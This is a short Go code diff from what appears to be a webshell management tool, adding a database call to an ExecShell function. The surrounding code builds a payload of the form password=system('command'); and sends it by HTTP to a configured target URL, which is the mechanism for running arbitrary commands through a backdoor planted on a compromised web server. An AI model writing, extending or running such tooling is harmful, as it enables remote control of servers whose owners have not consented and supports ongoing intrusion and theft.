@@ -4,11 +4,13 @@ package shell
 import (
 	"fmt"
 	"io"
+	"webshellManager/database"
 	"webshellManager/http"
 	"webshellManager/util"
 )
 
 func ExecShell(payload string) (*string, error) {
+	database.SelectDb()
 	shellPayload := fmt.Sprintf("%s=system('%s');", util.Passwd, payload)
 	respShell, err := http.MakeRequest(shellPayload, util.HttpURL, util.UserAgent)
 	{
